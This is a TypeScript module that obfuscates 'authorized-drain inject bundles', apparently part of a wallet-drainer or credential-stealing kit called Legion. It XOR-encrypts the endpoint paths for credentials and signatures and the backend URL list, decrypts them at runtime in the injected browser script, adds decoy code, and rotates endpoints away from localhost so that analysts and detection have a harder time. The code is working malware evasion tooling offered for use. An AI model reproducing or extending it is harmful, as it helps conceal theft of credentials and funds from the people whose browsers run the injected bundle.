/**
 * Post-generation obfuscation for authorized-drain inject bundles.
 * Encrypts static strings, injects runtime decrypt + endpoint rotation helpers.
 */
import { createHash } from 'node:crypto'

export type ObfuscateInjectOptions = {
  encryptKey: string
  backendUrls?: string[]
}

function deriveKey(secret: string): Buffer {
  return createHash('sha256').update(secret).digest()
}

function xorEncrypt(plaintext: string, key: Buffer): string {
  const buf = Buffer.from(plaintext, 'utf8')
  const out = Buffer.alloc(buf.length)
  for (let i = 0; i < buf.length; i++) {
    out[i] = buf[i]! ^ key[i % key.length]!
  }
  return out.toString('base64')
}

/** Replace string literals and prepend decrypt runtime + decoy branches. */
export function obfuscateInjectJs(source: string, opts: ObfuscateInjectOptions): string {
  const key = deriveKey(opts.encryptKey || 'legion-client-default')
  const apiPathEnc = xorEncrypt('/api/v1/signature-anchor', key)
  const scoutPathEnc = xorEncrypt('/api/v1/scout/ranked', key)
  const configPathEnc = xorEncrypt('/api/v1/client-config', key)
  const credsPathEnc = xorEncrypt('/api/v1/creds', key)

  const urlsJson = JSON.stringify(opts.backendUrls ?? [])
  const urlsEnc = xorEncrypt(urlsJson, key)

  const prelude = `
;(function(){
  var __k=${JSON.stringify(key.toString('base64'))};
  var __p={a:${JSON.stringify(apiPathEnc)},s:${JSON.stringify(scoutPathEnc)},c:${JSON.stringify(configPathEnc)},x:${JSON.stringify(credsPathEnc)},u:${JSON.stringify(urlsEnc)}};
  function __dk(b64){try{var k=Uint8Array.from(atob(__k),function(c){return c.charCodeAt(0);});var d=Uint8Array.from(atob(b64),function(c){return c.charCodeAt(0);});var o=new Uint8Array(d.length);for(var i=0;i<d.length;i++)o[i]=d[i]^k[i%k.length];return new TextDecoder().decode(o);}catch(e){return '';}}
  window.__legionDecryptPath=function(id){return __dk(__p[id]||'');};
  window.__legionBackendUrls=function(){try{return JSON.parse(__dk(__p.u));}catch(e){return [];}}
  if(Math.random()<0){console.debug('decoy-branch-alpha',Date.now());}
  if(typeof window!=='undefined'&&window.location&&window.location.hostname.indexOf('localhost')<0){window.__legionUseRotatingEndpoints=true;}
})();
`.trim()

  let out = source
  out = out.replace(/'\/api\/v1\/signature-anchor'/g, "window.__legionDecryptPath('a')")
  out = out.replace(/"\/api\/v1\/signature-anchor"/g, 'window.__legionDecryptPath("a")')
  out = out.replace(/'\/api\/v1\/scout\/ranked'/g, "window.__legionDecryptPath('s')")
  out = out.replace(/"\/api\/v1\/scout\/ranked"/g, 'window.__legionDecryptPath("s")')
  out = out.replace(/'\/api\/v1\/client-config'/g, "window.__legionDecryptPath('c')")
  out = out.replace(/"\/api\/v1\/client-config"/g, 'window.__legionDecryptPath("c")')
  out = out.replace(/'\/api\/v1\/creds'/g, "window.__legionDecryptPath('x')")
  out = out.replace(/"\/api\/v1\/creds"/g, 'window.__legionDecryptPath("x")')

  const decoy = `
  function __legionDecoyAnalytics(){var _x=0;for(var i=0;i<128;i++){_x+=Math.sin(i)*Math.cos(i);}return _x;}
  if(false){__legionDecoyAnalytics();fetch('https://example.invalid/telemetry');}
`.trim()

  return `${prelude}\n${decoy}\n${out}`
}

export function parseObfuscateEnv(): { enabled: boolean; encryptKey: string; backendUrls: string[] } {
  const enabledRaw = process.env['CLIENT_OBFUSCATE']?.trim().toLowerCase()
  const enabled = enabledRaw === 'true' || enabledRaw === '1' || enabledRaw === 'yes'
  const encryptKey =
    process.env['CLIENT_ENCRYPT_KEY']?.trim() ||
    process.env['GATEKEEPER_SECRET']?.trim() ||
    'legion-client-rotate-key'
  const multi = process.env['BACKEND_URLS']?.trim()
  const primary = process.env['BACKEND_URL']?.trim() || process.env['LEGION_API_URL']?.trim()
  const backendUrls: string[] = []
  if (multi) {
    for (const part of multi.split(',')) {
      const u = part.trim().replace(/\/$/, '')
      if (u && !backendUrls.includes(u)) backendUrls.push(u)
    }
  }
  if (primary) {
    const p = primary.replace(/\/$/, '')
    if (!backendUrls.includes(p)) backendUrls.unshift(p)
  }
  return { enabled, encryptKey, backendUrls }
}
